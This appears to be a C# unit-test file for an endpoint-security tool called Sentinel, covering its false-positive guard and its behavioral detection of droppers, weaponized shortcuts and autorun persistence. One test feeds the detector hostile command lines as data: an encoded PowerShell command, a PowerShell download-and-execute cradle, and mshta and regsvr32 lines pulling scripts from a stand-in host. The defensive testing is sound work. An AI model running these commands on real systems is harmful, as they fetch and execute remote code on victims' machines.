using Sentinel.Core.Behavioral;
using Sentinel.Core.Settings;

namespace Sentinel.Core.Tests;

public class BehavioralCorrelationTests
{
    private sealed class FakeTime(DateTimeOffset start) : TimeProvider
    {
        private DateTimeOffset _now = start;
        public override DateTimeOffset GetUtcNow() => _now;
        public void Advance(TimeSpan by) => _now += by;
    }

    private static readonly DateTimeOffset T0 = new(2026, 11, 16, 12, 0, 0, TimeSpan.Zero);

    // ---- FalsePositiveGuard ----

    [Fact]
    public void Guard_ProtectsRealSystemFile_ButNotMasqueradingFakeInTemp()
    {
        var guard = new FalsePositiveGuard();
        Assert.Equal(GuardDecision.Protected, guard.Evaluate(new GuardContext { Path = @"C:\Windows\System32\lsass.exe", Score = 95 }).Decision);
        Assert.Equal(GuardDecision.Act, guard.Evaluate(new GuardContext { Path = @"C:\Temp\lsass.exe", Score = 95 }).Decision);
    }

    [Fact]
    public void Guard_ProtectsSentinelOwnDirectories()
    {
        var guard = new FalsePositiveGuard();
        Assert.Equal(GuardDecision.Protected, guard.Evaluate(new GuardContext { Path = @"C:\Program Files\Sentinel\Sentinel.Service.exe", Score = 90 }).Decision);
        Assert.Equal(GuardDecision.Protected, guard.Evaluate(new GuardContext { Path = @"C:\ProgramData\Sentinel\Quarantine\x.bin", Score = 90 }).Decision);
    }

    [Fact]
    public void Guard_AllowList_ByPathAndHash_BlocksAction()
    {
        var allowed = new AllowedExclusions { Paths = [@"C:\Users\Bob\Tools"], Hashes = [new string('a', 64)] };
        var guard = new FalsePositiveGuard(allowed);
        Assert.Equal(GuardDecision.Protected, guard.Evaluate(new GuardContext { Path = @"C:\Users\Bob\Tools\dev.exe", Score = 90 }).Decision);
        Assert.Equal(GuardDecision.Protected, guard.Evaluate(new GuardContext { Path = @"C:\x\y.exe", Sha256 = new string('a', 64), Score = 90 }).Decision);
    }

    [Fact]
    public void Guard_CleanCache_BlocksAction()
    {
        var guard = new FalsePositiveGuard(isKnownClean: p => p == @"C:\Users\Bob\app.exe");
        Assert.Equal(GuardDecision.Protected, guard.Evaluate(new GuardContext { Path = @"C:\Users\Bob\app.exe", Score = 88 }).Decision);
    }

    [Fact]
    public void Guard_TrustedSignature_LowersScore_AndBlocksAutoQuarantine()
    {
        var guard = new FalsePositiveGuard();
        var verdict = guard.Evaluate(new GuardContext { Path = @"C:\Users\Bob\signed.exe", Score = 90, HasValidTrustedSignature = true });
        Assert.Equal(GuardDecision.AskUser, verdict.Decision);
        Assert.Equal(55, verdict.EffectiveScore); // 90 - 35
    }

    [Theory]
    [InlineData(40, GuardDecision.LogOnly)]
    [InlineData(60, GuardDecision.AskUser)]
    [InlineData(85, GuardDecision.Act)]
    public void Guard_Thresholds(int score, GuardDecision expected) =>
        Assert.Equal(expected, new FalsePositiveGuard().Evaluate(new GuardContext { Path = @"C:\Users\Bob\x.exe", Score = score }).Decision);

    [Fact]
    public void Guard_ShadowMode_NeverActs_AsksInstead()
    {
        var verdict = new FalsePositiveGuard().Evaluate(new GuardContext { Path = @"C:\Users\Bob\x.exe", Score = 95, ShadowMode = true });
        Assert.Equal(GuardDecision.AskUser, verdict.Decision);
    }

    // ---- BehavioralCorrelationEngine ----

    [Fact]
    public void BH01_DropperStaging_FileThenShortcut()
    {
        var time = new FakeTime(T0);
        var engine = new BehavioralCorrelationEngine(time);
        Assert.Null(engine.ReportFileWritten(@"C:\Users\Bob\AppData\Local\Temp\payload.exe", isSigned: false));
        time.Advance(TimeSpan.FromSeconds(10));
        var finding = engine.ReportShortcutOrScript(@"C:\Users\Bob\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk", null);
        Assert.NotNull(finding);
        Assert.Equal(CorrelationChain.DropperStaging, finding!.Chain);
        Assert.Equal(50, finding.Score);
    }

    [Fact]
    public void BH01_DoesNotFire_WhenShortcutComesTooLate()
    {
        var time = new FakeTime(T0);
        var engine = new BehavioralCorrelationEngine(time);
        engine.ReportFileWritten(@"C:\Users\Bob\AppData\Local\Temp\payload.exe", isSigned: false);
        time.Advance(TimeSpan.FromSeconds(45)); // > 30 с
        Assert.Null(engine.ReportShortcutOrScript(@"C:\Users\Bob\Desktop\clean.lnk", null));
    }

    [Theory]
    [InlineData(@"powershell.exe -enc ZQBjAGgAbwA=")]
    [InlineData(@"powershell -Command IEX(New-Object Net.WebClient).DownloadString('http://x')")]
    [InlineData(@"mshta http://evil.test/a.hta")]
    [InlineData(@"rundll32 javascript:alert(1)")]
    [InlineData(@"regsvr32 /s /n /u /i:http://evil.test/x.sct scrobj.dll")]
    public void BH02_WeaponizedArtifact_IsDetected(string commandLine)
    {
        var engine = new BehavioralCorrelationEngine(new FakeTime(T0));
        var finding = engine.ReportShortcutOrScript(@"C:\Users\Bob\Desktop\invoice.lnk", commandLine);
        Assert.NotNull(finding);
        Assert.Equal(CorrelationChain.WeaponizedArtifact, finding!.Chain);
        Assert.Equal(55, finding.Score);
    }

    [Fact]
    public void BH02_CleanShortcut_IsNotFlagged() =>
        Assert.Null(new BehavioralCorrelationEngine(new FakeTime(T0))
            .ReportShortcutOrScript(@"C:\Users\Bob\Desktop\notepad.lnk", @"C:\Windows\System32\notepad.exe"));

    [Fact]
    public void BH03_PersistenceToUnsignedProfileBinary()
    {
        var engine = new BehavioralCorrelationEngine(new FakeTime(T0));
        var finding = engine.ReportAutorunEntry("Run", @"C:\Users\Bob\AppData\Roaming\svc.exe", targetSigned: false);
        Assert.NotNull(finding);
        Assert.Equal(CorrelationChain.PersistenceUnsignedProfile, finding!.Chain);
        Assert.Equal(65, finding.Score);
    }

    [Fact]
    public void BH03_DoesNotFire_ForSignedOrSystemTarget()
    {
        var engine = new BehavioralCorrelationEngine(new FakeTime(T0));
        Assert.Null(engine.ReportAutorunEntry("Run", @"C:\Users\Bob\AppData\Roaming\upd.exe", targetSigned: true));
        Assert.Null(engine.ReportAutorunEntry("Run", @"C:\Windows\System32\svc.exe", targetSigned: false));
    }

    [Fact]
    public void RingBuffer_EvictsOldEntries_WhenOverCapacity()
    {
        var engine = new BehavioralCorrelationEngine(new FakeTime(T0), capacity: 16);
        for (var i = 0; i < 100; i++)
        {
            engine.ReportFileWritten($@"C:\Users\Bob\Documents\clean{i}.docx", isSigned: false);
        }

        Assert.True(engine.Count <= 16);
    }

    [Fact]
    public void SlidingWindow_PrunesEventsOlderThan60Seconds()
    {
        var time = new FakeTime(T0);
        var engine = new BehavioralCorrelationEngine(time);
        engine.ReportFileWritten(@"C:\Users\Bob\AppData\Local\Temp\a.exe", isSigned: false);
        time.Advance(TimeSpan.FromSeconds(90));
        engine.ReportFileWritten(@"C:\Users\Bob\AppData\Local\Temp\b.exe", isSigned: false);
        Assert.Equal(1, engine.Count); // старое событие вытеснено окном 60 с
    }
}
